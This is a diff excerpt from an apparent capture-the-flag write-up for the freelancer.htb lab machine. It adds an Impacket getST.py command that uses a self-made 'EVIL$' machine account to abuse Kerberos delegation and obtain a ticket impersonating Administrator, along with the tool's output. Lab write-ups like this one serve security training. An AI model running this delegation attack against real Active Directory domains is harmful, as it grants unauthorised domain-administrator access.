@@ -726,7 +726,20 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Ill configure the delegation with my new machine account i made
 
 ```python
+faketime -f +5h getST.py -spn 'cifs/dc.freelancer.htb' -impersonate "Administrator" -dc-ip 10.129.66.164 "freelancer.htb"/"EVIL$":'Password123!'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.freelancer.htb@FREELANCER.HTB.ccache
+```
+
+Then after syncing to the DC, i can get an administrator TGT
+
+```
 ```
 
 
